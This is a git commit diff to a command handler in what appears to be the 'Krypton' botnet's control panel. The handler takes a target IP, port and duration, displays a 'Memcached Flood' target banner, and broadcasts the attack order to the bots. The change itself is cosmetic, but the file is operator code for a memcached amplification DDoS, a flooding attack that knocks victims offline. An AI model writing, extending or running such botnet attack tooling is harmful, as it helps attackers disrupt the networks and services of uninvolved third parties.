fd187f3f4be78fd7b187c4c7b55745e2e9497cd4
cirqueira <118860604+CirqueiraDev@users.noreply.github.com>
2024-01-22 16:22:53 -0300

    Update mem.py

--- src/Commands/Methods_L4/mem.py
+++ src/Commands/Methods_L4/mem.py
@@ -5,10 +5,19 @@ def mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clea
         ip = args[1]
         port = args[2]
         secs = args[3]
+
+        xxxx = '''%s============= (%sTARGET%s) ==============
+            %s  IP:%s %s
+            %sPORT:%s %s
+            %sTIME:%s %s
+          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, ip, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs,Fore.CYAN, Fore.LIGHTWHITE_EX, 'Memcached Flood')
+
         if validate_ip(ip):
             if validate_port(port):
                 if validate_time(secs):
-                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
+                    for x in xxxx.split('\n'):
+                        send(client, '\x1b[3;31;40m'+ x)
+                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                     broadcast(data)
                 else:
                     send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
@@ -17,4 +26,4 @@ def mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clea
         else:
             send(client, Fore.RED + '\nInvalid IP-address\n')
     else:
-        send(client, '\nUsage: .mem [IP] [PORT] [TIME]\n')
+        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.mem [IP] [PORT] [TIME]\n')
